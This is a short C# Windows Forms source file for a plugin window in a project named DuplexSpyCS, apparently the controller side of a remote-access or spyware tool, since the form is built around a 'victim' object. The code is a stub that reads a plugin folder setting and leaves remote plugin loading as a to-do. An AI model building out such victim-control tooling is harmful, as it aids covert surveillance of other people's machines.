using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmPlugin : Form
    {
        private clsVictim m_victim { get; set; }

        private string m_szPluginDirectory { get; set; }
        private clsIniManager m_iniMgr = clsStore.ini_manager;

        public frmPlugin(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
            m_szPluginDirectory = m_iniMgr.Read("Plugin", "Directory");
        }

        void fnRefresh()
        {
            listView1.Items.Clear();

            //todo: Load remote plugin

            toolStripStatusLabel1.Text = $"Plugin[{listView1.Items.Count}]";
        }

        void fnSetup()
        {
            fnRefresh();
        }

        private void frmPlugin_Load(object sender, EventArgs e)
        {
            fnSetup();
        }
    }
}
